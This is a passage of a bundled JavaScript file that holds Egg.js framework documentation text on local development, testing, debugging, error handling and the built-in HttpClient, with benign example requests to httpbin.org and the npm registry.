default:",paraId:15,tocIndex:3},{value:"${app_root}/app/view",paraId:16,tocIndex:3},{value:"${app_root}/app/assets",paraId:16,tocIndex:3},{value:"${app_root}/app/public",paraId:16,tocIndex:3},{value:"${app_root}/app/web",paraId:16,tocIndex:3},{value:"set ",paraId:17,tocIndex:3},{value:"config.development.overrideIgnore",paraId:17,tocIndex:3},{value:" to ",paraId:17,tocIndex:3},{value:"true",paraId:17,tocIndex:3},{value:" to skip defaults merge.",paraId:17,tocIndex:3},{value:"Starting app in local will listen to port 7001 by default. You may assign other port to it like this:",paraId:18,tocIndex:4},{value:`{
  "scripts": {
    "dev": "egg-bin dev --port 7001"
  }
}
`,paraId:19,tocIndex:4},{value:"Here we mainly cover the usage of the tools, for more details about unit tests, please refer to ",paraId:20,tocIndex:5},{value:"here",paraId:21,tocIndex:5},{value:".",paraId:20,tocIndex:5},{value:"Add ",paraId:22,tocIndex:6},{value:"npm scripts",paraId:22,tocIndex:6},{value:" into ",paraId:22,tocIndex:6},{value:"package.json",paraId:22,tocIndex:6},{value:"\uFF1A",paraId:22,tocIndex:6},{value:`{
  "scripts": {
    "test": "egg-bin test"
  }
}
`,paraId:23,tocIndex:6},{value:"And then we can run unit test by ",paraId:24,tocIndex:6},{value:"npm test",paraId:24,tocIndex:6},{value:".",paraId:24,tocIndex:6},{value:"To run test cases, environment needs to be set as ",paraId:25,tocIndex:7},{value:"env: unittest",paraId:25,tocIndex:7},{value:". The configuration comes from the combination of both ",paraId:25,tocIndex:7},{value:"config.local.js",paraId:25,tocIndex:7},{value:" and ",paraId:25,tocIndex:7},{value:"config.unittest.js",paraId:25,tocIndex:7},{value:".",paraId:25,tocIndex:7},{value:"npm test",paraId:26,tocIndex:8},{value:" command will look for all the files ended with ",paraId:26,tocIndex:8},{value:".test.js",paraId:26,tocIndex:8},{value:" under test folder (default ",paraId:26,tocIndex:8},{value:"glob",paraId:26,tocIndex:8},{value:" matching rule is ",paraId:26,tocIndex:8},{value:"test/**/*.test.js",paraId:26,tocIndex:8},{value:").",paraId:26,tocIndex:8},{value:"However, we would like to run only the test cases that we are working on sometimes. In this case, we may specify a file in the following way:",paraId:27,tocIndex:8},{value:`$ TESTS=test/x.test.js npm test
`,paraId:28,tocIndex:8},{value:"glob",paraId:29,tocIndex:8},{value:" expressions are supported here.",paraId:29,tocIndex:8},{value:"Mocha supports various reporters. Default reporter is ",paraId:30,tocIndex:9},{value:"spec",paraId:30,tocIndex:9},{value:".",paraId:30,tocIndex:9},{value:"Reporter is allowed to be specified mannually via setting TEST_REPORTER as the environment variable. For example, to use ",paraId:31,tocIndex:9},{value:"dot",paraId:31,tocIndex:9},{value:" instead:",paraId:31,tocIndex:9},{value:`$ TEST_REPORTER=dot npm test
`,paraId:32,tocIndex:9},{value:"The default timeout is 30 seconds. We may set our own timeout (in milliseconds). For example, setting timeout to 5 seconds:",paraId:33,tocIndex:10},{value:`$ TEST_TIMEOUT=5000 npm test
`,paraId:34,tocIndex:10},{value:"Besides environment variables, ",paraId:35,tocIndex:11},{value:"egg-bin test",paraId:35,tocIndex:11},{value:" also supports passing parameters directly, and it supports all mocha parameters. You may refer to ",paraId:35,tocIndex:11},{value:"mocha usage",paraId:35,tocIndex:11},{value:".",paraId:35,tocIndex:11},{value:`$ # Passing parameters via npm need to add an extra \`--\`, according to https://docs.npmjs.com/cli/run-script
$ npm test -- --help
$
$ # Equivalent to \`TESTS=test/**/test.js npm test\`. Since the limitation of bash, it's better to add double qoute to path.
$ npm test "test/**/test.js"
$
$ # Equivalent to \`TEST_REPORTER=dot npm test\`
$ npm test -- --reporter=dot
$
$ # Parameters of mocha are supported, such as grep, require, etc.
$ npm test -- -t 30000 --grep="should GET"
`,paraId:36,tocIndex:11},{value:"egg-bin has build-in ",paraId:37,tocIndex:12},{value:"nyc",paraId:37,tocIndex:12},{value:" to support calculating code coverage report of unit test.",paraId:37,tocIndex:12},{value:"Add ",paraId:38,tocIndex:12},{value:"npm scripts",paraId:38,tocIndex:12},{value:" into ",paraId:38,tocIndex:12},{value:"package.json",paraId:38,tocIndex:12},{value:"\uFF1A",paraId:38,tocIndex:12},{value:`{
  "scripts": {
    "cov": "egg-bin cov"
  }
}
`,paraId:39,tocIndex:12},{value:"And then we can get code coverage report of unit test via ",paraId:40,tocIndex:12},{value:"npm run cov",paraId:40,tocIndex:12},{value:".",paraId:40,tocIndex:12},{value:`$ egg-bin cov

  test/controller/home.test.js
    GET /
      \u2713 should status 200 and get the body
    POST /post
      \u2713 should status 200 and get the request body

  ...

  16 passing (1s)

=============================== Coverage summary ===============================
Statements   : 100% ( 41/41 )
Branches     : 87.5% ( 7/8 )
Functions    : 100% ( 10/10 )
Lines        : 100% ( 41/41 )
================================================================================
`,paraId:41,tocIndex:12},{value:"And we may open HTML file of complete code coverage report via ",paraId:42,tocIndex:12},{value:"open coverage/lcov-report/index.html",paraId:42,tocIndex:12},{value:".",paraId:42,tocIndex:12},{value:"Just like test, the environment needs to be set to ",paraId:43,tocIndex:13},{value:"env:unittest",paraId:43,tocIndex:13},{value:" to run cov, and the configuration comes from the combination of both ",paraId:43,tocIndex:13},{value:"config.local.js",paraId:43,tocIndex:13},{value:" and ",paraId:43,tocIndex:13},{value:"config.unittest.js",paraId:43,tocIndex:13},{value:".",paraId:43,tocIndex:13},{value:"To ignore some files in code coverage rate calculation, You may use ",paraId:44,tocIndex:14},{value:"COV_EXCLUDES",paraId:44,tocIndex:14},{value:" as the environment variable to ignore some specific files that don't need the test converages:",paraId:44,tocIndex:14},{value:`$ COV_EXCLUDES=app/plugins/c* npm run cov
$ # Or pass this setting via parameters
$ npm run cov -- --x=app/plugins/c*
`,paraId:45,tocIndex:14},{value:"Logger",paraId:11},{value:"There's a built-in ",paraId:46,tocIndex:17},{value:"Log",paraId:47,tocIndex:17},{value:" in the egg, so you may use logger.debug() to print out debug information. ",paraId:46,tocIndex:17},{value:"We recommend you use it in your own code.",paraId:46,tocIndex:17},{value:`// controller
this.logger.debug('current user: %j', this.user);

// service
this.ctx.logger.debug('debug info from service');

// app/init.js
app.logger.debug('app init');
`,paraId:48,tocIndex:17},{value:"Levels of logs can be configured via ",paraId:49,tocIndex:17},{value:"config.logger.level",paraId:49,tocIndex:17},{value:" for printing into file, and ",paraId:49,tocIndex:17},{value:"config.logger.consoleLevel",paraId:49,tocIndex:17},{value:" for printing into console.",paraId:49,tocIndex:17},{value:"Debug",paraId:11},{value:"debug",paraId:50,tocIndex:18},{value:" module is a debug tool widely adopted in Node.js community, plenty of modules are using it to print debug information. So for the Egg community. ",paraId:50,tocIndex:18},{value:"We recommand you use it in your own development of framework and plugins.",paraId:50,tocIndex:18},{value:"It's easy for us to watch the whole process of test through ",paraId:51,tocIndex:18},{value:"DEBUG",paraId:51,tocIndex:18},{value:" as the environment variable to start with certain code.",paraId:51,tocIndex:18},{value:'(Do not confuse debug module with logger module, for the latter also has quite a lot of functions, what we mean "log" here is the debug info.)',paraId:52,tocIndex:18},{value:"Turn on log of all modules:",paraId:53,tocIndex:18},{value:`$ DEBUG=* npm run dev
`,paraId:54,tocIndex:18},{value:"Turn on log of specific module:",paraId:55,tocIndex:18},{value:`$ DEBUG=egg* npm run dev
`,paraId:56,tocIndex:18},{value:"Detail logs of unit tests progress are able to be viewed via ",paraId:57,tocIndex:18},{value:"DEBUG=* npm test",paraId:57,tocIndex:18},{value:".",paraId:57,tocIndex:18},{value:"egg-bin",paraId:11},{value:"Add ",paraId:58,tocIndex:20},{value:"npm scripts",paraId:58,tocIndex:20},{value:" into ",paraId:58,tocIndex:20},{value:"package.json",paraId:58,tocIndex:20},{value:"\uFF1A",paraId:58,tocIndex:20},{value:`{
  "scripts": {
    "debug": "egg-bin debug"
  }
}
`,paraId:59,tocIndex:20},{value:"And then we may set breakpoints for debugging our app via ",paraId:60,tocIndex:20},{value:"npm run debug",paraId:60,tocIndex:20},{value:".",paraId:60,tocIndex:20},{value:"egg-bin",paraId:61,tocIndex:20},{value:" will select debug protocol automatically. ",paraId:61,tocIndex:20},{value:"Inspector Protocol",paraId:61,tocIndex:20},{value:" will be selected for version 8.x and later. For earlier ones, ",paraId:61,tocIndex:20},{value:"Legacy Protocol",paraId:61,tocIndex:20},{value:" is the choice.",paraId:61,tocIndex:20},{value:"Meanwhile, It also supports customized debug parameters.",paraId:62,tocIndex:20},{value:`$ egg-bin debug --inpsect=9229
`,paraId:63,tocIndex:20},{value:"Debug port of ",paraId:64,tocIndex:20},{value:"master",paraId:64,tocIndex:20},{value:" is 9229 or 5858 (Legacy Protocol).",paraId:64,tocIndex:20},{value:"Debug port of ",paraId:64,tocIndex:20},{value:"agent",paraId:64,tocIndex:20},{value:" is fixed to 5800, it is customizable via ",paraId:64,tocIndex:20},{value:"process.env.EGG_AGENT_DEBUG_PORT",paraId:64,tocIndex:20},{value:".",paraId:64,tocIndex:20},{value:"Debug port number of ",paraId:64,tocIndex:20},{value:"worker",paraId:64,tocIndex:20},{value:" will increase from ",paraId:64,tocIndex:20},{value:"master",paraId:64,tocIndex:20},{value:" port number.",paraId:64,tocIndex:20},{value:'During developing period, worker will "hot restart" once the code is changed, and it will cause the increase of port. Please refer to the following IDE configuration for auto-reconnecting.',paraId:64,tocIndex:20},{value:"App starts by ",paraId:65,tocIndex:21},{value:"env: local",paraId:65,tocIndex:21},{value:" when executing debug . The configuration comes from the combination of both ",paraId:65,tocIndex:21},{value:"config.local.js",paraId:65,tocIndex:21},{value:" and ",paraId:65,tocIndex:21},{value:"config.unittest.js",paraId:65,tocIndex:21},{value:".",paraId:65,tocIndex:21},{value:"DevTools",paraId:11},{value:"The latest DevTools only supports ",paraId:66,tocIndex:22},{value:"Inspector Protocol",paraId:66,tocIndex:22},{value:". Thus you will need to install Node.js 8.x or higher verions to be able to use it.",paraId:66,tocIndex:22},{value:"Execute ",paraId:67,tocIndex:22},{value:"npm run debug",paraId:67,tocIndex:22},{value:" to start it:",paraId:67,tocIndex:22},{value:`\u279C  showcase git:(master) \u2717 npm run debug

> showcase@1.0.0 debug /Users/tz/Workspaces/eggjs/test/showcase
> egg-bin debug

Debugger listening on ws://127.0.0.1:9229/f8258ca6-d5ac-467d-bbb1-03f59bcce85b
For help see https://nodejs.org/en/docs/inspector
2017-09-14 16:01:35,990 INFO 39940 [master] egg version 1.8.0
Debugger listening on ws://127.0.0.1:5800/bfe1bf6a-2be5-4568-ac7d-69935e0867fa
For help see https://nodejs.org/en/docs/inspector
2017-09-14 16:01:36,432 INFO 39940 [master] agent_worker#1:39941 started (434ms)
Debugger listening on ws://127.0.0.1:9230/2fcf4208-4571-4968-9da0-0863ab9f98ae
For help see https://nodejs.org/en/docs/inspector
9230 opened
Debug Proxy online, now you could attach to 9999 without worry about reload.
DevTools \u2192 chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9999/__ws_proxy__
`,paraId:68,tocIndex:22},{value:"And then choose one of the following ways:",paraId:69,tocIndex:22},{value:"Visit the ",paraId:70,tocIndex:22},{value:"DevTools",paraId:70,tocIndex:22},{value:" URL printed in the last few lines in console directly. Since this URL is proxied from worker, you don't need to worry about restarting.",paraId:70,tocIndex:22},{value:"Open ",paraId:70,tocIndex:22},{value:"chrome://inspect",paraId:70,tocIndex:22},{value:", and config port accordingly, then click ",paraId:70,tocIndex:22},{value:"Open dedicated DevTools for Node",paraId:70,tocIndex:22},{value:" to open debug console.",paraId:70,tocIndex:22},{value:"egg-bin",paraId:71,tocIndex:23},{value:" will read environment variable ",paraId:71,tocIndex:23},{value:"$NODE_DEBUG_OPTION",paraId:71,tocIndex:23},{value:" set in WebStorm debug mode.",paraId:71,tocIndex:23},{value:"Start npm debug in WebStorm\uFF1A",paraId:72,tocIndex:23},{value:"VSCode",paraId:11},{value:"There are 2 ways:",paraId:73,tocIndex:24},{value:"1st method: open settings in VSCode, turn on ",paraId:74,tocIndex:24},{value:"Debug: Toggle Auto Attach",paraId:74,tocIndex:24},{value:", and then execute ",paraId:74,tocIndex:24},{value:"npm run debug",paraId:74,tocIndex:24},{value:" in the terminal.",paraId:74,tocIndex:24},{value:"2nd method: setup ",paraId:75,tocIndex:24},{value:".vscode/launch.json",paraId:75,tocIndex:24},{value:" in VSCode, and then simply start with F5 key. (Note: You have to turn off the settings mentioned in the 1st method before doing it).",paraId:75,tocIndex:24},{value:`// .vscode/launch.json
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Launch Egg",
      "type": "node",
      "request": "launch",
      "cwd": "\${workspaceRoot}",
      "runtimeExecutable": "npm",
      "windows": { "runtimeExecutable": "npm.cmd" },
      "runtimeArgs": [ "run", "debug" ],
      "console": "integratedTerminal",
      "protocol": "auto",
      "restart": true,
      "port": 9229,
      "autoAttachChildProcesses": true
    }
  ]
}
`,paraId:76,tocIndex:24},{value:"And we offer a ",paraId:77,tocIndex:24},{value:"vscode-eggjs",paraId:77,tocIndex:24},{value:" extention to setup auto-matically.",paraId:77,tocIndex:24},{value:"For more options of setting up debug in VSCode, please refer to ",paraId:78,tocIndex:24},{value:"Node.js Debugging in VS Code",paraId:78,tocIndex:24},{value:".",paraId:78,tocIndex:24},{value:"If you would like to know more about local development, like customizing a local development tool for your team, please refer to ",paraId:79,tocIndex:25},{value:"egg-bin",paraId:79,tocIndex:25},{value:".",paraId:79,tocIndex:25}]},40314:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(98605);const t=[{value:"Taking benefits from framework asynchronous support, all exceptions can be caught by ",paraId:0,tocIndex:0},{value:"try catch",paraId:0,tocIndex:0},{value:".",paraId:0,tocIndex:0},{value:"With those features, you can take following implementation as reference:",paraId:1,tocIndex:0},{value:`// app/service/test.js
try {
  const res = await this.ctx.curl('http://eggjs.com/api/echo', {
    dataType: 'json',
  });
  if (res.status !== 200) throw new Error('response status is not 200');
  return res.data;
} catch (err) {
  this.logger.error(err);
  return {};
}
`,paraId:2,tocIndex:0},{value:"Generally, you can use ",paraId:3,tocIndex:0},{value:"try catch",paraId:3,tocIndex:0},{value:" to catch exceptions. However, some implementations may break this mechanism down. Imaging that ",paraId:3,tocIndex:0},{value:"await",paraId:3,tocIndex:0},{value:" makes generators run in order just like a chain. What will happen if one of them jumpoff the chain? The following code can help you realize the imagination:",paraId:3,tocIndex:0},{value:`// app/controller/home.js
class HomeController extends Controller {
  async buy() {
    const request = {};
    const config = await ctx.service.trade.buy(request);
    // checking the deal and don't block current request
    setImmediate(() => {
      ctx.service.trade.check(request).catch((err) => ctx.logger.error(err));
    });
  }
}
`,paraId:4,tocIndex:0},{value:"In this case, you may find that the exceptions in ",paraId:5,tocIndex:0},{value:"setImmediate",paraId:5,tocIndex:0},{value:" will be swallowed because the scope breaks the chain, although egg already handled exceptions externally.",paraId:5,tocIndex:0},{value:"Above scene is also considered. To catch the exception inside the scope, You can invoke helper method ",paraId:6,tocIndex:0},{value:"ctx.runInBackground(scope)",paraId:6,tocIndex:0},{value:" to wrap the chain back. Now, the exceptions will be detected and caught.",paraId:6,tocIndex:0},{value:`class HomeController extends Controller {
  async buy() {
    const request = {};
    const config = await ctx.service.trade.buy(request);
    // checking the deal and don't block current request
    ctx.runInBackground(async () => {
      // Exceptions thrown here will be caught in background and printed into log.
      await ctx.service.trade.check(request);
    });
  }
}
`,paraId:7,tocIndex:0},{value:"For convenience of locating problems, exceptions must be guaranteed to be Error object or object based on Error object, which offers a trace of which functions were called.",paraId:8,tocIndex:0},{value:"egg-onerror",paraId:9,tocIndex:1},{value:`, one of Egg's plugin, handles all exceptions thrown in Middleware, Controller and Service, and returns the error as response based on "Accept" in request header field.`,paraId:9,tocIndex:1},{value:"Accept",paraId:10,tocIndex:1},{value:"ENV",paraId:10,tocIndex:1},{value:"errorPageUrl",paraId:10,tocIndex:1},{value:"response",paraId:10,tocIndex:1},{value:"HTML & TEXT",paraId:10,tocIndex:1},{value:"local & unittest",paraId:10,tocIndex:1},{value:"-",paraId:10,tocIndex:1},{value:"onerror built-in error page",paraId:10,tocIndex:1},{value:"HTML & TEXT",paraId:10,tocIndex:1},{value:"others",paraId:10,tocIndex:1},{value:"YES",paraId:10,tocIndex:1},{value:"redirect to errorPageUrl",paraId:10,tocIndex:1},{value:"HTML & TEXT",paraId:10,tocIndex:1},{value:"others",paraId:10,tocIndex:1},{value:"NO",paraId:10,tocIndex:1},{value:"onerror built-in error page(simple, not recommended)",paraId:10,tocIndex:1},{value:"JSON & JSONP",paraId:10,tocIndex:1},{value:"local & unittest",paraId:10,tocIndex:1},{value:"-",paraId:10,tocIndex:1},{value:"JSON Object or JSONP response body with details",paraId:10,tocIndex:1},{value:"JSON & JSONP",paraId:10,tocIndex:1},{value:"others",paraId:10,tocIndex:1},{value:"-",paraId:10,tocIndex:1},{value:"JSON object or JSONP response body without details",paraId:10,tocIndex:1},{value:"errorPageUrl",paraId:11},{value:"Redirecting to your customized error page by setting ",paraId:12,tocIndex:2},{value:"errorPageUrl",paraId:12,tocIndex:2},{value:" in ",paraId:12,tocIndex:2},{value:"onerror",paraId:12,tocIndex:2},{value:" plugin.",paraId:12,tocIndex:2},{value:"onerror",paraId:13,tocIndex:2},{value:" config in ",paraId:13,tocIndex:2},{value:"config/config.default.js",paraId:13,tocIndex:2},{value:":",paraId:13,tocIndex:2},{value:`module.exports = {
  onerror: {
    errorPageUrl: '/50x.html',
  },
};
`,paraId:14,tocIndex:2},{value:"Once the default handler no longer meet your needs, you still can customize your owner error handler by onerror's configurations.",paraId:15,tocIndex:3},{value:`// config/config.default.js
module.exports = {
  onerror: {
    all(err, ctx) {
      // Define an error handler for all type of Response.
      // Once config.all present, other type of error handlers will be ignored.
      ctx.body = 'error';
      ctx.status = 500;
    },
    html(err, ctx) {
      // html handler
      ctx.body = '<h3>error</h3>';
      ctx.status = 500;
    },
    json(err, ctx) {
      // json handler
      ctx.body = { message: 'error' };
      ctx.status = 500;
    },
    jsonp(err, ctx) {
      // Generally, we don't need to customize jsonp error handler.
      // It will call json error handler and wrap to jsonp type response.
  },
};
`,paraId:16,tocIndex:3},{value:"Egg won't take ",paraId:17,tocIndex:4},{value:"NOT FOUND",paraId:17,tocIndex:4},{value:" from back-end as exception. Instead, if ",paraId:17,tocIndex:4},{value:"NOT FOUND",paraId:17,tocIndex:4},{value:" is emitted without a body, it will return the following JSON object as default response.",paraId:17,tocIndex:4},{value:"identified as JSON:",paraId:18,tocIndex:4},{value:`{
  "message": "Not Found"
}
`,paraId:19,tocIndex:4},{value:"identified as HTML:",paraId:20,tocIndex:4},{value:`<h1>404 Not Found</h1>
`,paraId:21,tocIndex:4},{value:"Overriding default 404 page to the one you want:",paraId:22,tocIndex:4},{value:`// config/config.default.js
module.exports = {
  notfound: {
    pageUrl: '/404.html',
  },
};
`,paraId:23,tocIndex:4},{value:"If you want a customized 404 response, you only need to create a middleware to handle it once, just like handling exceptions above.",paraId:24,tocIndex:5},{value:`// app/middleware/notfound_handler.js
module.exports = () => {
  return async function notFoundHandler(ctx, next) {
    await next();
    if (ctx.status === 404 && !ctx.body) {
      if (ctx.acceptJSON) {
        ctx.body = { error: 'Not Found' };
      } else {
        ctx.body = '<h1>Page Not Found</h1>';
      }
    }
  };
};
`,paraId:25,tocIndex:5},{value:"Adding yours to ",paraId:26,tocIndex:5},{value:"middleware",paraId:26,tocIndex:5},{value:" in config:",paraId:26,tocIndex:5},{value:`// config/config.default.js
module.exports = {
  middleware: ['notfoundHandler'],
};
`,paraId:27,tocIndex:5}]},14826:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(26015);const t=[{value:"Countless services rely on the HTTP-based communication nowadays, and it is a very common application scenario that web applications call back-end HTTP services.",paraId:0},{value:"The framework built in [HttpClient] based on [urllib], you can quickly complete any HTTP request.",paraId:1},{value:"app",paraId:2},{value:"[HttpClient] will initialize to ",paraId:3,tocIndex:0},{value:"app.httpclient",paraId:3,tocIndex:0},{value:` automatically during the application's initialization.
Also added an method `,paraId:3,tocIndex:0},{value:"app.curl(url, options)",paraId:3,tocIndex:0},{value:", which is equivalent to the ",paraId:3,tocIndex:0},{value:"app.httpclient.request(url, options)",paraId:3,tocIndex:0},{value:".",paraId:3,tocIndex:0},{value:"So you can easily use ",paraId:4,tocIndex:0},{value:"app.curl",paraId:4,tocIndex:0},{value:" to complete a HTTP request.",paraId:4,tocIndex:0},{value:`// app.js
module.exports = (app) => {
  app.beforeStart(async () => {
    // example: read the version info on https://registry.npmmirror.com/egg/latest when it starts
    const result = await app.curl('https://registry.npmmirror.com/egg/latest', {
      dataType: 'json',
    });
    app.logger.info('Egg latest version: %s', result.data.version);
  });
};
`,paraId:5,tocIndex:0},{value:"ctx",paraId:2},{value:"Framework also provides ",paraId:6,tocIndex:1},{value:"ctx.curl(url, options)",paraId:6,tocIndex:1},{value:" and ",paraId:6,tocIndex:1},{value:"ctx.httpclient",paraId:6,tocIndex:1},{value:` in Context, same as app.
So it's very easy to use `,paraId:6,tocIndex:1},{value:"ctx.curl()",paraId:6,tocIndex:1},{value:" to complete a HTTP request in the Context (such as in the controller)",paraId:6,tocIndex:1},{value:`// app/controller/npm.js
class NpmController extends Controller {
  async index() {
    const ctx = this.ctx;

    // example: request a npm module's info
    const result = await ctx.curl('https://registry.npmmirror.com/egg/latest', {
      // parse JSON response
      dataType: 'json',
      // timeout of 3s
      timeout: 3000,
    });

    ctx.body = {
      status: result.status,
      headers: result.headers,
      package: result.data,
    };
  }
}
`,paraId:7,tocIndex:1},{value:"HTTP has been widely used and have several methods to make request, but the methods are similar. We start with the basic four request methods then move to some more complex scenario.",paraId:8,tocIndex:2},{value:"In the following example, we will complete the request of ",paraId:9,tocIndex:2},{value:"https://httpbin.org",paraId:9,tocIndex:2},{value:" in the controller.",paraId:9,tocIndex:2},{value:"Reading data almost uses GET request. It is the most common type and widely used in the world of HTTP. And it is also easier to construct a request parameter.",paraId:10,tocIndex:3},{value:`// app/controller/npm.js
class NpmController extends Controller {
  async get() {
    const ctx = this.ctx;
    const result = await ctx.curl('https://httpbin.org/get?foo=bar');
    ctx.status = result.status;
    ctx.set(result.headers);
    ctx.body = result.data;
  }
}
`,paraId:11,tocIndex:3},{value:"GET request might not need to set ",paraId:12,tocIndex:3},{value:"options.method",paraId:12,tocIndex:3},{value:". HttpClient Defalut method is set to ",paraId:12,tocIndex:3},{value:"GET",paraId:12,tocIndex:3},{value:"Return ",paraId:12,tocIndex:3},{value:"result",paraId:12,tocIndex:3},{value:" will contains 3 attributes: ",paraId:12,tocIndex:3},{value:"status",paraId:12,tocIndex:3},{value:", ",paraId:12,tocIndex:3},{value:"headers",paraId:12,tocIndex:3},{value:" and ",paraId:12,tocIndex:3},{value:"data",paraId:12,tocIndex:3},{value:"status",paraId:13,tocIndex:3},{value:": response status\uFF0Cfor example ",paraId:13,tocIndex:3},{value:"200",paraId:13,tocIndex:3},{value:", ",paraId:13,tocIndex:3},{value:"302",paraId:13,tocIndex:3},{value:", ",paraId:13,tocIndex:3},{value:"404",paraId:13,tocIndex:3},{value:", ",paraId:13,tocIndex:3},{value:"500",paraId:13,tocIndex:3},{value:" and etc",paraId:13,tocIndex:3},{value:"headers",paraId:13,tocIndex:3},{value:": response header\uFF0Csimilar to ",paraId:13,tocIndex:3},{value:"{ 'content-type': 'text/html', ... }",paraId:13,tocIndex:3},{value:"data",paraId:13,tocIndex:3},{value:`: response body\uFF0Cdefault HttpClient doesn't do anything and returns as Buffer directly.
Once the `,paraId:13,tocIndex:3},{value:"options.dataType",paraId:13,tocIndex:3},{value:" is set\uFF0CHttpClient will process the ",paraId:13,tocIndex:3},{value:"data",paraId:13,tocIndex:3},{value:" based on the parameters",paraId:13,tocIndex:3},{value:"For the complete request parameter ",paraId:14,tocIndex:3},{value:"options",paraId:14,tocIndex:3},{value:" and return value ",paraId:14,tocIndex:3},{value:"result",paraId:14,tocIndex:3},{value:", refer to below section ",paraId:14,tocIndex:3},{value:"options Parameters in Detail",paraId:15,tocIndex:3},{value:"The scenario of creating data generally uses the POST request with body parameter, one more parameter compared to GET.",paraId:16,tocIndex:4},{value:"Take sending JSON boy as example:",paraId:17,tocIndex:4},{value:`// app/controller/npm.js
class NpmController extends Controller {
  async post() {
    const ctx = this.ctx;
    const result = await ctx.curl('https://httpbin.org/post', {
      // method is required
      method: 'POST',
      // telling HttpClient to send data as JSON by contentType
      contentType: 'json',
      data: {
        hello: 'world',
        now: Date.now(),
      },
      // telling HttpClient to process the return body as JSON format explicitly
      dataType: 'json',
    });
    ctx.body = result.data;
  }
}
`,paraId:18,tocIndex:4},{value:"The following will explain POST to achieve Form function of form submission and file upload in detail.",paraId:19,tocIndex:4},{value:"Similar to POST, but PUT is better for data updating and replacement. Almost the same parameters as POST except setting method as ",paraId:20,tocIndex:5},{value:"PUT",paraId:20,tocIndex:5},{value:".",paraId:20,tocIndex:5},{value:`// app/controller/npm.js
class NpmController extends Controller {
  async put() {
    const ctx = this.ctx;
    const result = await ctx.curl('https://httpbin.org/put', {
      // method is required
      method: 'PUT',
      // telling HttpClient to send data as JSON by contentType
      contentType: 'json',
      data: {
        update: 'foo bar',
      },
      // telling HttpClient to process the return body as JSON format explicitly
      dataType: 'json',
    });
    ctx.body = result.data;
  }
}
`,paraId:21,tocIndex:5},{value:"DELETE request is to delete the data, request body don't need to add request body but HttpClient don't have the limitation.",paraId:22,tocIndex:6},{value:`// app/controller/npm.js
class NpmController extends Controller {
  async del() {
    const ctx = this.ctx;
    const result = await ctx.curl('https://httpbin.org/delete', {
      // method is required
      method: 'DELETE',
      // telling HttpClient to process the return body as JSON format explicitly
      dataType: 'json',
    });
    ctx.body = result.data;
  }
}
`,paraId:23,tocIndex:6},{value:"In some real application scenarios, still have some more complex HTTP requests.",paraId:24,tocIndex:7},{value:"Interfaces of Browser-Oriented Form Submission (without files), usually require ",paraId:25,tocIndex:8},{value:"content-type: application/x-www-form-urlencoded",paraId:25,tocIndex:8},{value:" for the data requesting.",paraId:25,tocIndex:8},{value:`// app/controller/npm.js
class NpmController extends Controller {
  async submit() {
    const ctx = this.ctx;
    const result = await ctx.curl('https://httpbin.org/post', {
      // method is required, supports POST\uFF0CPUT and DELETE
      method: 'POST',
      // contentType is not needed, by default HttpClient will send request in application/x-www-form-urlencoded
      data: {
        now: Date.now(),
        foo: 'bar',
      },
      // telling HttpClient to process the return body as JSON format explicitly
      dataType: 'json',
    });
    ctx.body = result.data.form;
    // final response will similar as below:
    // {
    //   "foo": "bar",
    //   "now": "1483864184348"
    // }
  }
}
`,paraId:26,tocIndex:8},{value:"Once form submission contains files, submission of requesting data must be ",paraId:27,tocIndex:9},{value:"multipart/form-data",paraId:27,tocIndex:9},{value:`
[urllib] has a built-in module [formstream] to generate `,paraId:27,tocIndex:9},{value:"form",paraId:27,tocIndex:9},{value:" objects that can be consumed by HttpClient.",paraId:27,tocIndex:9},{value:`// app/controller/http.js
class HttpController extends Controller {
  async upload() {
    const { ctx } = this;

    const result = await ctx.curl('https://httpbin.org/post', {
      method: 'POST',
      dataType: 'json',
      data: {
        foo: 'bar',
      },

      // one file
      files: __filename,

      // many files
      // files: {
      //   file1: __filename,
      //   file2: fs.createReadStream(__filename),
      //   file3: Buffer.from('mock file content'),
      // },
    });

    ctx.body = result.data.files;
    // Response:
    // {
    //   "file": "'use strict';\\n\\nconst For...."
    // }
  }
}
`,paraId:28,tocIndex:9},{value:`In fact, Stream is the leading in the world of Node.js.
If the server supports streaming, the most friendly way is to send the Stream directly. Actually, Stream will be sent in `,paraId:29,tocIndex:10},{value:"Transfer-Encoding: chunked",paraId:29,tocIndex:10},{value:" transmission coding format, which is implemented by [HTTP] module automatically.",paraId:29,tocIndex:10},{value:`// app/controller/npm.js
const fs = require('fs');
const FormStream = require('formstream');
class NpmController extends Controller {
  async uploadByStream() {
    const ctx = this.ctx;
    // uploading the current file for test propose
    const fileStream = fs.createReadStream(__filename);
    // httpbin.org not support stream mode, use the local stream interface instead
    const url = \`\${ctx.protocol}://\${ctx.host}/stream\`;
    const result = await ctx.curl(url, {
      // method is required, supports POST\uFF0CPUT
      method: 'POST',
      // submitted by stream mode
      stream: fileStream,
    });
    ctx.status = result.status;
    ctx.set(result.headers);
    ctx.body = result.data;
    // final response will similar as below:
    // {"streamSize":574}
  }
}
`,paraId:30,tocIndex:10},{value:"Due to the complexity of HTTP Request, the options parameters of ",paraId:31,tocIndex:11},{value:"httpclient.request(url, options)",paraId:31,tocIndex:11},{value:" quite large. The actual usage of each optional parameter will be shown with descriptions and coding as below.",paraId:31,tocIndex:11},{value:`// config/config.default.js
exports.httpclient = {
  // whether to enable local DNS cache, default disable, enable will have two characteristics
  // 1. All DNS lookup will prefer to use the cache by default, even DNS query error does not affects the application
  // 2. For the same hostname, query only once during the interval of dnsCacheLookupInterval (default 10s)
  enableDNSCache: false,
  // minimum interval of DNS query on the same hostname
  dnsCacheLookupInterval: 10000,
  // maximum number of hostname DNS cache simultaneously, default 1000
  dnsCacheMaxLength: 1000,

  request: {
    // default timeout of request
    timeout: 3000,
  },

  httpAgent: {
    // default enable http KeepAlive
    keepAlive: true,
    // idle KeepAlive socket can survive for 4 seconds
    freeSocketTimeout: 4000,
    // when sockets have no activity for more than 30s, it will be processed as timeout
    timeout: 30000,
    // maximum number of sockets allow to be created
    maxSockets: Number.MAX_SAFE_INTEGER,
    // maximum number of idle sockets
    maxFreeSockets: 256,
  },

  httpsAgent: {
    // default enable https KeepAlive
    keepAlive: true,
    // idle KeepAlive socket can survive for 4 seconds
    freeSocketTimeout: 4000,
    // when sockets have no activity for more than 30s, it will be processed as timeout
    timeout: 30000,
    // maximum number of sockets allow to be created
    maxSockets: Number.MAX_SAFE_INTEGER,
    // maximum number of idle sockets
